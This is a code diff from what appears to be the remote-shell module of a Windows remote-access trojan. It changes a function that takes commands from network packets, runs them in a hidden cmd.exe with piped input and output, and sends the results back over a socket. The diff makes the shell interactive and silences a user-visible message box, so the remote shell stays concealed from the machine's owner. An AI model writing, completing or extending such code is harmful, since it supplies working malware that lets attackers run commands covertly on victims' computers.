@@ -37,13 +37,18 @@ void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
 DWORD WINAPI ExecuteShell(LPVOID lParam)
 {
 	CPacket* pPacket = (CPacket*)lParam;
-	WCHAR pszCommand[512];
-	memcpy(pszCommand, pPacket->m_pbPacketBody, 512);
+	//WCHAR pszCommand[512];
+	//memcpy(pszCommand, pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);
+	//pszCommand[pPacket->m_dwPacketBodyLength] = '\n';
 	CSocketClient* m_pChildSocketClient = pPacket->m_pSocketClient;
+
+	CHAR pszCmd[512];
+	DWORD dwBytesWritten = 0;
 
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	HANDLE hRead = NULL, hWrite = NULL;
+	HANDLE hRead2 = NULL, hWrite2 = NULL;
 
 	WCHAR pszSystemPath[300] = { 0 };
 	char SendBuf[2048] = { 0 };	
@@ -57,28 +62,40 @@ DWORD WINAPI ExecuteShell(LPVOID lParam)
 	sa.bInheritHandle = TRUE;
 
 	//创建匿名管道
-	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
+	if (!CreatePipe(&hRead, &hWrite2, &sa, 0)) {
+		goto Clean;
+	}
+	if (!CreatePipe(&hRead2, &hWrite, &sa, 0)) {
 		goto Clean;
 	}
 
 	si.cb = sizeof(STARTUPINFO);
 	GetStartupInfo(&si);
-	si.hStdError = hWrite;
-	si.hStdOutput = hWrite;	
+	si.hStdInput = hRead2;
+	si.hStdError = hWrite2;
+	si.hStdOutput = hWrite2;	
 	si.wShowWindow  =SW_HIDE;
 	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
 
 	// 获取系统目录
 	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath)); 
 	// 拼接成cmd命令
-	StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe /c %s", pszSystemPath, pszCommand);
+	//StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe /c %s", pszSystemPath, pszCommand);
+	StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe", pszSystemPath);
 
 	// 创建进程，执行cmd命令
 	if (!CreateProcess(NULL, pszExecuteCommand, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
 		DebugPrint("error = 0x%x\n", GetLastError());
 		goto Clean;
 	}
+	
 
+	WideCharToMultiByte(CP_ACP, 0, (PWSTR)pPacket->m_pbPacketBody, -1, pszCmd, 512, NULL, NULL);
+	strcat_s(pszCmd, "\n");
+	
+	WriteFile(hWrite, pszCmd, strlen(pszCmd), &dwBytesWritten, NULL);
+
+	Sleep(1000);
 	while (TRUE)
 	{
 		bool bReadSuccess = ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL);
@@ -92,7 +109,7 @@ DWORD WINAPI ExecuteShell(LPVOID lParam)
 				BOOL bRet = m_pChildSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
 			}
 			else {
-				MessageBox(0, L"ClientSocket exit", L"", 0);
+				//MessageBox(0, L"ClientSocket exit", L"", 0);
 			}
 		}
 
